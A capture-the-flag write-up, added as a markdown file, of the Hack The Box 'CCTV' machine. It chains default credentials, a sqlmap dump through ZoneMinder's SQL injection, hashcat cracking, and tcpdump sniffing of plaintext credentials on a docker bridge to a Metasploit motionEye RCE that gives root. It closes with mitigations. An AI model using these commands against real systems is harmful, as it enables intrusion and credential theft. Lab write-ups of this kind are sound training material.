@@ -1,0 +1,332 @@
+# HTB "CCTV" — Full Walkthrough
+
+**Author:** pytha90ras
+**Category:** Web Exploitation → Credential Exposure → Privilege Escalation
+**Chain:** Default Credential Login → Blind SQL Injection (ZoneMinder CVE-2024-51482) → Hash Extraction & Cracking → SSH Credential Reuse → Docker Bridge Traffic Sniffing → Plaintext Credential Leak → Legacy Service Discovery (Port Forwarding) → MotionEye RCE (CVE-2025-60787) → Root
+
+> A note on how this one was solved: everything through gaining a shell as `mark` was done independently. Finding the actual privilege-escalation path from `mark` to `sa_mark` — specifically, the idea of checking `/opt` and then sniffing the docker bridge interfaces for plaintext credentials — is a step I checked a walkthrough for after `sudo -l`, SUID, crontab, systemd timers, and the kernel all came back as dead ends. I'm documenting it the way I'd document any other step, but I want to be upfront that I didn't find that particular lead on my own.
+Replace every IP, port, cookie value, hash, and cracked password below with your own.
+
+---
+
+## 0. Recon — Nmap
+
+```bash
+nmap -p- --open 10.129.57.25
+nmap -p22,80 -sCV -vvv 10.129.57.25
+```
+
+Same shape as usual: only **22 (SSH)** and **80 (HTTP)** open.
+
+---
+
+## 1. Initial Web Enumeration
+
+Visiting the site directly redirected to `cctv.htb`. Added the domain and target IP to `/etc/hosts`:
+
+```bash
+echo "10.129.57.25  cctv.htb" | sudo tee -a /etc/hosts
+```
+
+Page loaded. The first significant thing on it was a **staff login button** — immediately worth considering for SQL injection, but with no known username or sense of what the backend expected, that was premature. 
+Crawled the rest of the site first looking for a username or any other lead.
+
+Found nothing usable through crawling. With no better lead, tried the two cheapest options: a brute-force attempt using `admin` as the username, and plain default credentials.
+
+**`admin` / `admin` worked on the first try.**
+
+---
+
+## 2. Exploring the Admin Panel
+
+Logged in and started going through every option in the top navigation. Under **storage**, found a path: `/var/cache/zoneminder/events`. Under the **API**, found two other users: **`mark`** and **`superadmin`**.
+
+The `admin` account turned out to be fairly limited — couldn't modify configuration, and a **privacy-restricted section** of the panel was inaccessible. `superadmin` looked like the account that would actually have that access.
+
+Also noted, from the admin's own info page, the running version: **ZoneMinder v1.37.63**.
+
+Tried logging in as `superadmin` directly — no credentials to try yet, so this went nowhere immediately. Went back to check the version instead, since a specific version number on a niche self-hosted app is usually worth checking against public exploit databases before doing anything more manual.
+
+---
+
+## 3. Finding the Vulnerability — ZoneMinder CVEs
+
+A quick search on `ZoneMinder 1.37.63` turned up two relevant public CVEs: **CVE-2024-51482** and **CVE-2024-43360**. Started with the first.
+
+Found the advisory: `https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3`. Tried the documented request unauthenticated first — got an error back, which made sense: the advisory's PoC assumes a valid session. Grabbed a session cookie from the browser (logged in as `admin`) and tried again with that attached.
+
+---
+
+## 4. Confirming and Exploiting the SQL Injection
+
+Pointed `sqlmap` at the vulnerable endpoint with the session cookie attached:
+
+```bash
+sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
+  --cookie="ZMSESSID=<your_own_session_id>" \
+  -p admin --batch
+```
+
+First attempt failed:
+
+```
+[CRITICAL] all testable parameters you provided are not present within the given request data
+```
+
+Worth flagging as a dead end explicitly — the wrong parameter was being targeted (`admin` isn't actually the injectable value here). After some back-and-forth, landed on dumping credentials directly for the two usernames already known from the API (`mark`, `superadmin`) rather than blindly extracting the whole table:
+
+```bash
+sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=<your_own_session_id>" --batch \
+  -D zm -T Users -C Username,Password  --where="Username='mark' OR Username='superadmin'" --dump
+```
+
+This worked, returning two bcrypt hashes:
+
+```
+mark:       $2y$10$prZGnazejKcuTv5bKNexXOgLyQ**GET**0hq07LW7AJ/QNqZolbXKfFG.
+superadmin: $2y$10$cmytVWFRnt1XfqsItsJRVe/Ap**YOURS**FQcURnm5N.rhlULwM0jrtbm
+```
+
+---
+
+## 5. Cracking the Hashes
+
+Both are salted bcrypt hashes (cost factor 10 — hashcat mode `3200`). Not worth brute-forcing character-by-character, so went straight to a wordlist attack against `rockyou.txt`:
+
+```bash
+hashcat -m 3200 -a 0 hash_key ../../rockyou.txt
+```
+
+`mark`'s hash cracked: **`openNONEsame`**. `superadmin`'s did not.
+
+---
+
+## 6. Credential Reuse — Into `mark` via SSH
+
+Went back into the ZoneMinder panel with `mark`'s cracked password to see what extra privilege it unlocked — but the same private/restricted section from before was still inaccessible. Nothing new on the web side.
+
+Tried the obvious next move: the same username and cracked password against SSH, in case of credential reuse between the web app and the underlying OS account.
+
+**It worked.**
+
+---
+
+## 7. Looking for the User Flag
+
+No flag sitting in `mark`'s home directory. Noticed another user on the box, **`sa_mark`** — the flag was likely there instead, but `mark` had no obvious way into that account yet.
+
+### 7.1 The Usual Checks First
+
+```bash
+sudo -l
+```
+Nothing — `mark` has no sudo rights.
+
+```bash
+find / -user mark 2>/dev/null | grep -v '/proc\|^/run\|^/sys'
+```
+Nothing interesting owned by `mark` outside the normal locations.
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+Only the usual SUID binaries (snap packages, standard system tools) — nothing custom.
+
+```bash
+cat /etc/passwd | grep -v nologin
+```
+Confirmed the real, login-capable users on the box, `sa_mark` included.
+
+Checked crontab and systemd timers next:
+
+```bash
+crontab -e
+systemctl list-timers --all
+```
+
+Both empty of anything interesting. Kernel version came back current (2026), so a kernel exploit was unlikely and not worth pursuing first. At this point every standard avenue was a dead end.
+
+---
+
+## 8. Privilege Escalation Lead — Docker Bridge Traffic
+
+*(This is the part I checked a walkthrough for. Documenting it the way I'd document any other step, but the lead itself — checking `/opt` and then sniffing the docker bridge interfaces — wasn't something I arrived at on my own.)*
+
+### 8.1 `/opt` and a Suspicious Log File
+
+Checking `/opt` turned up `/opt/video/backups/server.log`, which showed **`sa_mark`** being authorized into some service roughly once a minute — a recurring automated login. The file's owner was **1005**, looks suspicious, definitely not a regular user.
+
+### 8.2 Docker Interfaces
+
+Checked network interfaces and found **Docker** running, alongside six other interfaces roughly split into two pairs, each pair sharing a single master. Two of note:
+
+```
+br-3e74116c4022
+br-1b6b4b93c636
+```
+
+The recurring automated login in `server.log` suggested something was authenticating over the network at regular intervals — worth trying to actually capture that traffic rather than just reading about it.
+
+### 8.3 Sniffing
+
+```bash
+tcpdump -i br-3e74116c4022 -A -s 0 tcp
+```
+Returned mostly unreadable/binary noise — not the right interface.
+
+```bash
+tcpdump -i br-1b6b4b93c636 -A -s 0 tcp
+```
+Also mostly noise, but this time the capture contained **`sa_mark`'s username and password in plaintext** — the recurring login from the log file was happening in cleartext over this bridge.
+
+```
+sa_mark : X1l9f**EASY_PASS**jS7RZb
+```
+
+---
+
+## 9. SSH as `sa_mark`
+
+```bash
+ssh sa_mark@10.129.57.25
+```
+
+Logged in with the sniffed credentials. **Grabbed the user flag.**
+
+---
+
+## 10. Root — A Migration Announcement and a Legacy Service
+
+Found a PDF sitting in `sa_mark`'s home directory. No GUI on the box, no way to `cat` a PDF meaningfully, and no outbound way to host a quick Python server to pull it off — so the simplest path was to **base64-encode it, copy the text out, and decode it back into a PDF locally**:
+
+```bash
+base64 announcement.pdf
+# copy the output, then locally:
+# echo "<pasted_base64>" | base64 -d > announcement.pdf
+```
+
+The PDF turned out to be an internal announcement about **migrating to ZoneMinder** — and critically, it noted that **passwords would remain unchanged** during the migration. That implied the *old* system, whatever it was, might still accept the same `admin` / `admin` credentials that worked on ZoneMinder. Needed to find that old service first.
+
+### 10.1 Finding the Legacy Service
+
+```bash
+ss -tulnp
+```
+
+Filtered out the UDP ports and the already-known TCP ports (80, 53, 22) and was left with:
+
+```
+8765  — ultraseek (MCP)
+9081  — meshery server 
+8888  — jupyter notebook
+33060 — mysqlx
+8454  — unassigned
+7999  — atlassian bitbucket
+1935  — rtmp
+3306  — mysql
+```
+
+`8765` stood out as the most promising candidate for an older camera/CCTV-adjacent web service.
+
+### 10.2 Port Forwarding In
+
+```bash
+sshpass -p 'X1l9f**PASS**jS7RZb' ssh sa_mark@10.129.57.25 -L 8765:127.0.0.1:8765
+```
+
+Navigated to `localhost:8765` and found a web login for **motionEye**. Tried a handful of credential combinations before finding the right one:
+
+- `admin` / `X1l9fx1ZjS7RZb` — **worked**
+
+So the migration note was right about password reuse — just not about *which* username the old password carried over to.
+
+### 10.3 Exploiting motionEye
+
+The panel showed the running version: **motionEye 0.43.1b4**. A search for public exploits against that version turned up **CVE-2025-60787**. Checked Metasploit first before doing anything manual, and found a matching module:
+
+```
+exploit/linux/http/motioneye_auth_rce_cve_2025_60787
+```
+
+Set the required options (target host, forwarded port, credentials) and ran it.
+
+**Got a root shell.** Grabbed the root flag.
+
+---
+
+## 11. Vulnerabilities Found & How They Could Have Been Prevented
+
+### 1. Default Credentials on the Primary Admin Panel
+**Root cause:** The ZoneMinder web interface accepted `admin` / `admin` — a default credential pair that was never changed after deployment.
+
+**Mitigation:** Force a credential change on first login for any privileged account, and disable or alert on any account still holding a known default password.
+
+### 2. Unauthenticated-Adjacent Blind SQL Injection (CVE-2024-51482)
+**Root cause:** A known, unpatched ZoneMinder vulnerability allowed SQL injection via a request parameter to anyone holding a valid session cookie, regardless of that session's actual privilege level.
+
+**Mitigation:** Keep self-hosted software patched against known CVEs — the fix for this issue was already public. Parameterize all database queries so injected input can never change query structure, independent of patch status.
+
+### 3. Weak Password Hygiene Enabling Offline Cracking
+**Root cause:** `mark`'s password (`opensesame`) was weak enough to be recovered from a bcrypt hash using a common wordlist in a short amount of time.
+
+**Mitigation:** Enforce minimum password complexity and length, and check new passwords against known-breached password lists (e.g. Have I Been Pwned's Pwned Passwords) at creation time.
+
+### 4. Credential Reuse Between Web Application and OS-Level SSH
+**Root cause:** `mark`'s ZoneMinder password was identical to `mark`'s SSH password — one leaked credential granted both a web session and shell access.
+
+**Mitigation:** No shared secrets between application-layer logins and OS-level authentication. Prefer key-based SSH authentication over passwords entirely.
+
+### 5. Plaintext Credentials Sent Over an Internal Network
+**Root cause:** An automated process authenticated `sa_mark` into a service roughly every minute, and that authentication traveled over a docker bridge interface **in plaintext**, visible to anything capable of sniffing that interface.
+
+**Mitigation:** Encrypt all service-to-service authentication, even on interfaces assumed to be "internal" or container-local — internal-only is not the same as safe-to-leave-unencrypted, and anything running with sufficient access on the host can still observe that traffic.
+
+### 6. Password Reuse Carried Across a System Migration
+**Root cause:** During the migration from the legacy CCTV service (motionEye) to ZoneMinder, passwords were intentionally kept unchanged — meaning a credential compromised on one system remained valid on the other, including the one nobody was actively monitoring anymore.
+
+**Mitigation:** Treat any system migration as a mandatory credential rotation point, not an opportunity to skip one. A decommissioned-but-still-running legacy service with live, working credentials is effectively an unmonitored backdoor into the current environment.
+
+### 7. Unpatched, Internet-Facing Legacy Service (CVE-2025-60787)
+**Root cause:** The old motionEye instance was left running and reachable, with a known, exploitable RCE vulnerability in its version, well after the organization had migrated away from it.
+
+**Mitigation:** Fully decommission — don't just stop *promoting* — legacy services once replaced. If a legacy service must stay running for any transitional reason, it still needs the same patch cadence and access restrictions as anything in active use.
+
+---
+
+## Summary Chain
+
+```
+Recon (nmap: 22, 80 open)
+      ↓
+Staff login found → crawl for creds → dead end → admin/admin works
+      ↓
+Admin panel enum → found mark, superadmin (API) + ZoneMinder v1.37.63
+      ↓
+Version lookup → CVE-2024-51482 → sqlmap w/ session cookie → dead end (wrong param)
+      ↓
+Correct injection target found → dumped mark + superadmin bcrypt hashes
+      ↓
+hashcat + rockyou.txt → cracked mark's password (superadmin resisted)
+      ↓
+Credential reuse → SSH as mark
+      ↓
+sudo -l / SUID / cron / systemd / kernel → all dead ends
+      ↓
+[walkthrough-assisted] /opt/video/backups/server.log → docker bridge interfaces found
+      ↓
+tcpdump on br-1b6b4b93c636 → sa_mark credentials sniffed in plaintext
+      ↓
+SSH as sa_mark → user flag
+      ↓
+PDF (base64 exfil) → migration announcement → password reuse hint
+      ↓
+Port scan → port 8765 forwarded via SSH → motionEye 0.43.1b4 found
+      ↓
+Credential scrambling → admin/X1l9fx1ZjS7RZb works
+      ↓
+CVE-2025-60787 → Metasploit module → root shell
+```
+
+---
+
+*Writeup by [pytha90ras](https://github.com/pytha90ras) — feel free to fork, adapt, or point out anything I got wrong. Section 8 (docker bridge sniffing lead) completed with walkthrough assistance; everything else was solved independently.*
